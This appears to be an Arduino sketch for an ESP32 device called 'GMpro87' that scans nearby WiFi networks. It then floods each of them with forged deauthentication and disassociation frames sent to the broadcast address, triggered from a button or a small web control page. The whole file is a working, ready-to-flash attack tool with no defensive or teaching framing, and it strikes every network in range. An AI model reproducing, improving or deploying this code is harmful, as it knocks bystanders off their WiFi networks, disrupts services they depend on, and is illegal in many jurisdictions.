#include <WiFi.h>
#include "esp_wifi.h"
#include <WebServer.h>
#include <vector>
#include <string>
#include "esp_wifi.h"

// --- PIN CONFIG ---
const int btnDeauth = 2;
const int btnScan = 3;
const int ledPin = 8;

// --- DATA ---
struct wifiData {
  int num = 0;
  std::vector<String> ssid;
  std::vector<String> bssid;
  std::vector<int> channel;
};

wifiData targetData;
bool isAttacking = false;
uint8_t broadcastAddr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

WebServer server(80);

// --- PACKET INJECTION ---
void sendPacket(const uint8_t* bssid, const uint8_t* sta) {
  struct __attribute__((packed)) {
    uint8_t fc[2], dur[2], a1[6], a2[6], a3[6], seq[2], reason[2];
  } pkt;
  memset(&pkt, 0, sizeof(pkt));
  memcpy(pkt.a1, sta, 6);
  memcpy(pkt.a2, bssid, 6);
  memcpy(pkt.a3, bssid, 6);
  
  for (int i = 0; i < 40; i++) {
    pkt.fc[0] = 0xC0; pkt.reason[0] = 0x07;
    esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&pkt, sizeof(pkt), false);
    pkt.fc[0] = 0xA0; pkt.reason[0] = 0x04;
    esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&pkt, sizeof(pkt), false);
    yield();
  }
}

// --- SCAN ---
void scanNet() {
  digitalWrite(ledPin, HIGH);
  targetData.ssid.clear();
  targetData.bssid.clear();
  targetData.channel.clear();
  int n = WiFi.scanNetworks();
  targetData.num = n;
  Serial.printf("[SCAN] Found %d networks\n", n);
  for (int i = 0; i < n; i++) {
    targetData.ssid.push_back(WiFi.SSID(i));
    targetData.channel.push_back(WiFi.channel(i));
    targetData.bssid.push_back(WiFi.BSSIDstr(i));
  }
  digitalWrite(ledPin, LOW);
}

// --- WEB UI ---
void handleRoot() {
  String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>";
  html += "<title>GMpro87</title><style>";
  html += "body{background:#111;color:#fff;font-family:sans-serif;padding:20px}";
  html += "h1{color:#0f0;text-align:center}";
  html += ".btn{background:#0f0;color:#000;padding:15px 30px;border:none;border-radius:8px;cursor:pointer;font-size:16px;margin:5px}";
  html += "btn:hover{background:#0c0}";
  html += ".status{padding:10px 20px;display:inline-block;border-radius:5px}";
  html += ".on{background:#0f0;color:#000}";
  html += ".off{background:#333}";
  html += "</style></head><body><h1>GMpro87</h1>";
  html += "<p>Networks: " + String(targetData.num) + "</p>";
  html += "<a href='/'><button class='btn'>Scan</button></a> ";
  html += "<a href='/attack'><button class='btn'>" + String(isAttacking ? "Stop" : "Attack") + "</button></a>";
  html += "<p>Status: <span class='status " + String(isAttacking ? "on'>RUNNING" : "off'>STOPPED") + "</span></p>";
  html += "<p>GMpro87 v1.2 | ESP32-WROOM-32U</p></body></html>";
  server.send(200, "text/html", html);
}

void handleScan() { scanNet(); server.sendHeader("Location","/"); server.send(302); }
void handleAttack() { isAttacking = !isAttacking; server.sendHeader("Location","/"); server.send(302); }

// --- SETUP ---
void setup() {
  Serial.begin(115200);
  pinMode(btnDeauth, INPUT_PULLUP);
  pinMode(btnScan, INPUT_PULLUP);
  pinMode(ledPin, OUTPUT);

  // === FIXED: AP FIRST, STAY ALIVE ===
  WiFi.mode(WIFI_AP_STA);      // AP + STA
  WiFi.softAP("GMpro", "Sangkur87"); // AP stays!
  Serial.println("[+] AP GMpro ready");
  Serial.print("[+] IP: "); Serial.println(WiFi.softAPIP());

  // Scan prep
  WiFi.disconnect();
  esp_wifi_set_promiscuous(true);

  // Web server
  server.on("/", handleRoot);
  server.on("/scan", handleScan);
  server.on("/attack", handleAttack);
  server.begin();

  Serial.println("[+] GMpro87 v1.2 Ready");
  Serial.println("[*] Web: http://192.168.4.1");
}

// --- LOOP ---
void loop() {
  server.handleClient();

  if (digitalRead(btnScan) == LOW) {
    delay(200); isAttacking = false; scanNet();
    while(digitalRead(btnScan) == LOW);
  }

  if (digitalRead(btnDeauth) == LOW) {
    delay(200);
    if (targetData.num > 0) {
      isAttacking = !isAttacking;
      Serial.println(isAttacking ? "[*] ATTACK ON" : "[*] ATTACK OFF");
    }
    while(digitalRead(btnDeauth) == LOW);
  }

  if (isAttacking && targetData.num > 0) {
    for (int i = 0; i < targetData.num; i++) { yield();
      if (!isAttacking) break;
      int ch = targetData.channel[i];
      if (ch < 1) ch = 1; if (ch > 13) ch = 13;
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      // Convert String to uint8_t for BSSID
      uint8_t bssid[6];
      sscanf(targetData.bssid[i].c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
            &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
      sendPacket(bssid, broadcastAddr);
      digitalWrite(ledPin, !digitalRead(ledPin));
      delay(1); yield();
    }
  } else {
    digitalWrite(ledPin, LOW);
  }
}